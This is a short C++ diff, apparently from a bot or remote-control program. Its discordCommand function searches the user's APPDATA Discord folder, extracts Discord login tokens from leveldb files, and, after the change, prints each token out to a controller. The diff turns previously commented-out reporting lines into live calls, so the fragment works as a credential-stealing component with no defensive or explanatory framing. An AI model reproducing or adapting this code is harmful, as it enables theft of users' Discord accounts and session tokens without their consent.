@@ -84,7 +84,7 @@ string parseLDB(const string path) {
 	return "";
 }
 
-int discordCommand(Controller *ctrl, DiscordCommand cmd) {
+int discordCommand(Controller& ctrl, DiscordCommand cmd) {
 	if (cmd == DiscordCommand::check) {
 		string discordPath = getenv("APPDATA");
 		discordPath += "/discord";
@@ -105,13 +105,13 @@ int discordCommand(Controller *ctrl, DiscordCommand cmd) {
 					string& token = parseLDB(p.path().string());
 					if (token.size() != 0) {
 						gotToken = true;
-						//ctrl->sendOut(token);
+						ctrl.println(token);
 					}
 				}
 			}
 			return !gotToken;
 		} catch (filesystem::filesystem_error &ex) {
-			//ctrl->sendErr(ex.what());
+			ctrl.err_println(ex.what());
 			return -2;
 		}
 	}
